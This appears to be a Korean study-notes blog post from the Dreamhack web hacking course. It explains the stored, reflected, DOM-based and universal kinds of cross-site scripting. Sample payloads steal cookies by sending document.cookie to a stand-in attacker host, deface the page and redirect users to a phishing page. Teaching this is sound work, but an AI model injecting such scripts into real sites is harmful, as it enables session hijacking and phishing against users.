---
layout : single
title : "STAGE4. Cross-Site-Scripting(XXS) (1)"
categories: Security
tag: [dreamhack, webhacking]
sidebar:
    nav: "docs"
---
# 드림핵 웹 Cross-Site-Scripting (XXS)
\* Cross Site Scripting의 약어는 CSS가 되는 것이 맞으나, 스타일 시트 정의 언어 CSS와의 중복으로, 혼동될 수 있어 XSS로 명명됨<br><br>
클라이언트 사이드의 취약점 : 웹 페이지의 이용자를 대상으로 공격할 수 있는 취약점으로, 이를 통해 이용자를 식별하기 위한 세션 및 쿠키 정보를 탈취하여 해당 계정으로 임의의 기능을 수행할 수 있다.

## XSS
클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에 오리진 권한으로 악성 스크립트를 삽입하여 웹 브라우저에서 해당 스크립트를 실행할 수 있다. SOP 보안 정책이 등장하며 서로 다른 오리진에서 정보를 읽는 행위가 어려워졌지만, 이를 우회하는 다양한 기술이 등장하며 XSS 공격은 지속되고 있다.


|XSS|Description|
|:------:|:---|
|Stored XSS|XSS에 사용되는 악성 스크립트가 서버에 저장되며, 서버에 응답에 담겨옴|
|Reflected XSS|XSS에 사용되는 악성 스크립트가 URL에 삽입되어 서버의 응답에 담겨옴|
|DOM-based XSS|XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입됨 (Fragment는 서버 요청/응답에 포함되지 않음)|
|Universal XSS|클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회함|

### 공격 코드 예시

**쿠키 및 세션 탈취 공격 코드*
```html
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

**페이지 변조 공격 코드*
```html
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

**위치 이동 공격 코드*
```html
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

## Stored XSS
서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS (게시물과 댓글에 악성 스크립트를 포함해 업로드)로, 이는 불특정 다수에게 보여지기 때문에 XSS 취약점이 존재할 경우 높은 파급력을 지닌다.

## Reflected XSS
서버가 악성 스크립트가 담긴 요청을 출력할 때 (게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함하여 검색) 발생한다.<br><br>
Stored XSS와 다르게, URL과 같은 이용자의 요청에 의해 발성하며, 공격을 위해서는 타 이용자가 악성 스크립트가 포함된 링크에 접속하도록 유도해야한다. 이 때, 주로 Click jacking 또는 Open Redirect 등 다른 취약점과 연계하여 사용한다.

## DOM(Document Object Model) based XSS
DOM은 HTML 및 XML 문서에 접근하는 방법을 표준으로 정의하는 문서 객체 모델로, 구조화된 문서의 표준 표현 방식이다. DOM based XSS 공격은 서버의 HTTP 응답은 변경하지 않지만, 피해자의 브라우저에서는 공격자가 악의적으로 변조한 DOM 환경으로 인해 공격 구문이 실행된다.(HTTP 응답에는 공격자의 공격 구문이 포함되지 않지만, DOM 객체가 생성될 경우 클라이언트 측 스크립트에 공격 구문이 포함된다) 위의 Stored XSS, Reflected XSS의 경우 서버 측의 결함으로 인해 응답 페이지에 악성 스크립트 구문이 포함되지만, DOM based XSS의 경우, 서버와 관계 없이 브라우저에서 발생한다. 
<br>

참고 : [link](https://ddungkill.tistory.com/135)

## Universal XSS
UXSS는 블특정한 사이트에서 발생 가능한 XSS로, 보통 웹보다는 모바일 앱, 네이티브 앱에서 발생하며, 예시로는 모바일 앱의 웹뷰 자체에서 발생하는 XSS로 인해 도메인과 관계 없이 정보를 탈취하는 것 등이 있다.

### 실습
-  [x]  XSS 발생 예시와 종류
-  [x]  Stored XSS
-  [x]  Reflected XSS